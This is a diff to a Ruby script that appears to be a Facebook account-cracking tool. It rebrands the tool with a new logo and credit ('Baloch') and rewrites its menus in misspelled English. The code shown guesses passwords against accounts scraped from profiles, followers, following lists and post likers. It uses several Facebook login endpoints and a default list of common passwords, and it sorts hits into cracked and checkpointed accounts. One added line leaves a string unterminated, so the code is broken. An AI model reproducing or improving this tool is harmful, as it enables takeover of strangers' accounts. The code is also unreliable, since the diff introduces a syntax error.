@@ -191,17 +191,17 @@ module Facebook
       @token = File.read('login.txt')
       @cp_save = File.join('results','CP',Time.now.strftime("_%d_%m_%Y.txt"))
       @ok_save = File.join('results','OK',Time.now.strftime("_%d_%m_%Y.txt"))
-      puts ("\n[ Silahkan Pilih Metode Crack ] ")
-      puts ("\n[1] Method Login b-api.facebook.com")
-      puts ("[2] Method Login m.facebook.com")
-      puts ("[3] Method Login mbasic.facebook.com")
-      puts ("[4]Method  Login free.facebook.com")
-      puts ("[5] Method Login touch.facebook.com")
+      puts ("\n[ CHOSE METHOD FOR CLONING ] ")
+      puts ("\n[1] METHOD LOGIN API")
+      puts ("[2] METHOD LOGIN M.FB")
+      puts ("[3] METHOD LOGIN MBASIC.FB")
+      puts ("[4] METHOD LOGIN FREE.FB")
+      puts ("[5] METHOD LOGIN TOUCH.FB")
       
       print ("\n[?] Pilih : ")
       tod = STDIN.gets.to_i
       case tod; when 1; @method = 'Api2'; when 2; @method = 'M'; when 3; @method = 'Mbasic'; when 4;@method = 'Free';else;@method = 'Touch';end
-      print ("\n[?] Password Auto/Manual (a/m) : ")
+      print ("\n[?] CRACKAUTO/MANUAL (A/M) : ")
       auto = STDIN.gets.chomp.downcase
       if auto == 'm'
         puts("\n[!] Gunakan ',' Sebagai pemisah, contoh: Anjing,Sayang")
@@ -212,7 +212,7 @@ module Facebook
           if a.empty?
             puts ("\n[!] Password Tidak Boleh Kosong!\n\n")
           elsif b.empty?
-            puts ("\n[!] Panjang Password Minimal 6 karakter\n\n")
+            puts ("\n[!] PASSWARD MINUAL 6 karakter\n\n")
           else
             @password = b.clone
             break
@@ -223,13 +223,13 @@ module Facebook
         @password = ['Anjing','Sayang','Kontol']
         @auto_pass = true
       end
-      print ("\n[?] Crack Menggunakan Tanggal Lahir (y/n) : ")
+      print ("\n[?] CRACK START (Y/N : ")
       @use_ttl = (STDIN.gets.chomp.downcase == 'y')
     end
 
     def start
-      puts ("\n[!] Hasil OK Tersimpan Di : #{@ok_save}")
-      puts ("[!] Hasil CP Tersimpan Di : #{@cp_save}\n\n")
+      puts ("\n[!] BALOCH OK SAVE AS : #{@ok_save}")
+      puts ("[!] BALOCH CP SAVE AS : #{@cp_save}\n\n")
       ok = 0
       cp = 0
       @email.each do |usr|
@@ -300,10 +300,10 @@ end
 
 $logo = <<-INI_LOGO
 
-  ________  ___  _______ __
- / ___/ _ \\/ _ |/ ___/ //_/ Author  : Baloch
-/ /__/ , _/ __ / /__/ ,<    Github  : BALOCH420
-\\___/_/|_/_/ |_\\___/_/|_|   Version : 1.0
+88""Yb    db    88      dP"Yb   dP""b8 88  88
+88__dP   dPYb   88     dP   Yb dP   `" 88  88
+88""Yb  dP__Yb  88  .o Yb   dP Yb      88888
+88oodP dP""""Yb 88ood8  YbodP   YboodP 88  88 
 
 INI_LOGO
 
@@ -330,14 +330,14 @@ def main
   puts ("[✓] ACTIVE USER : #{$name}")
   puts ("[✓] USER AGENT  : #{$ua.device.name}")
   puts ("[✓] IP ADDRESS  : #{$ip}\n\n")
-  puts ("[1] Crack From Public")
-  puts ("[2] Crack From Followers")
-  puts ("[3] Crack From Following")
-  puts ("[4] Crack From Like Post")
-  puts ("[5] Crack From both,Followers,Following")
-  puts ("[6] Fast Pro Crack")
-  puts ("[7] Settings User Agent")
-  puts ("[8] Logout (from token)")
+  puts ("[1] CRACK FROM PUBLIC")
+  puts ("[2] CRACK FROM FOLLOWERS")
+  puts ("[3] CRACK FROM FOLLOWIMG")
+  puts ("[4] CRACK FROM LIKE POST")
+  puts ("[5] CRACK FROM BOTH,FOLLOWERS,FOLLOWING")
+  puts ("[6] CRACK FAST PRO")
+  puts ("[7] SETTING")
+  puts ("[8] LOGOUT (FROM TOKENn)")
   puts ("[0] Exit\n\n")
   
   print ("[?] Pilih : ")
@@ -517,10 +517,10 @@ def LoginAkun
   begin
     system ('clear')
     puts ($logo)
-    puts ("[1] Login Via Email/password (api)")
-    puts ("[2] Login Via Email/password (mbasic)")
-    puts ("[3] Login Via Access Token")
-    puts ("[4] Login Via Cookies")
+    puts ("[1] LOGIN VIA EMAIL/PASSWARD (api)")
+    puts ("[2] LOGIN VIA EMAIL/PASSWARD (mbasic)")
+    puts ("[3] LOGIN VIA ACCESS TOKEN")
+    puts ("[4] LOGIN VIA COOKIES)
     puts ("[0] Exit")
 
     print ("\n[?] Pilih : ")
